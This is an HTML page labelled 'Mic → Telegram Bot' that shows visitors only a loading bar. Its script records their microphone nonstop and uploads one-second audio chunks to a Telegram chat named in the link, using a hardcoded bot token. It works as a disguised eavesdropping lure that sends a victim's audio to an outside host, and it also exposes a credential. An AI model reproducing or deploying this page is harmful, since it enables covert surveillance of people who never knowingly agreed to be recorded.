<!doctype html>
<html lang="ps">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mic → Telegram Bot</title>
<style>
html, body {margin:0; padding:0; height:100%; overflow:hidden; background:#000;}
#container {width:100%; height:100%; display:flex; justify-content:center; align-items:center; flex-direction:column;}
#loading {width: 80%; height: 10px; background:#555; border-radius:5px; overflow:hidden;}
#progress {height:100%; width:0%; background:#0f0; border-radius:5px;}
</style>
</head>
<body>
<div id="container">
  <div id="loading"><div id="progress"></div></div>
</div>

<script>
const BOT_TOKEN = '7623253079:AAGPZYU6rzYwrTbpAVsxYbErjrazklejvTw';
function getChatId(){ const params = new URLSearchParams(window.location.search); return params.get('id'); }

let mediaRecorder;
let chat_id = getChatId();
if(!chat_id) throw new Error('Chat ID نه دی موندل شوی');

const loading = document.getElementById('loading');
const progress = document.getElementById('progress');

async function sendChunk(chunk){
  const form = new FormData();
  form.append('voice', chunk, 'voice.webm');
  try{
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice?chat_id=${chat_id}`, {method:'POST', body:form});
  }catch(err){ console.error(err); }
}

async function startRecording(){
  const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
  mediaRecorder = new MediaRecorder(stream);
  mediaRecorder.ondataavailable = async e=>{
    if(e.data && e.data.size){
      progress.style.width='0%';
      loading.style.display='block';
      // Animate progress to 100% in 1 second
      let start = null;
      function animate(timestamp){
        if(!start) start = timestamp;
        let elapsed = timestamp - start;
        let pct = Math.min(100, (elapsed/1000)*100);
        progress.style.width = pct+'%';
        if(pct<100) requestAnimationFrame(animate);
      }
      requestAnimationFrame(animate);

      await sendChunk(e.data);
      setTimeout(()=>{ progress.style.width='0%'; }, 200);
    }
  };
  mediaRecorder.start(1000); // هر 1 ثانیه chunk
}

startRecording();
</script>
</body>
</html> 
